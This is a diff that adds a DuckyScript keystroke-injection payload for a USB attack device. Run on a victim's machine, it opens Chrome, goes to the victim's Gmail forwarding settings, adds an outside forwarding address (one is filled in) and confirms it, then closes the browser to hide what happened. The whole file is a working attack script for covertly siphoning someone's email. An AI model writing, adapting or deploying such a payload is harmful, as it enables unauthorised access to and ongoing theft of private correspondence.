@@ -1,0 +1,86 @@
+
+REM # -------------------------------------------------
+REM # Launch Chrome Browser and enable Desktop Mode
+REM # -------------------------------------------------
+
+TAB
+DELAY 250
+GUI f
+DELAY 1000
+UP
+DELAY 1000
+STRING chrome
+ENTER
+TAB
+DELAY 250
+ENTER
+DELAY 500
+TAB
+TAB
+TAB
+DELAY 100
+ENTER
+DELAY 800
+ALT e
+DELAY 1500
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+ENTER
+
+REM # ----------------------------------------------
+REM # Travel to Gmail forwarding settings page
+REM # ----------------------------------------------
+
+DELAY 800
+CTRL l
+DELAY 1000
+STRING https://mail.google.com/mail/u/0/#settings/fwdandpop
+DELAY 500
+ENTER
+DELAY 5000
+
+REM # ----------------------------------------------
+REM # Add email forward
+REM # ----------------------------------------------
+
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+DELAY 100
+ENTER
+DELAY 250
+
+REM # Enter your email here 
+STRING eylem@karaogullari.com
+
+DELAY 50
+ENTER
+DELAY 3000
+TAB
+ENTER
+DELAY 1500
+TAB
+DELAY 450
+ENTER
+
+REM # ----------------------------------------
+REM # Close Chrome Tab
+REM # ----------------------------------------
+
+CTRL w
+DELAY 800
+ALT f
+DELAY 500
+ALT f4
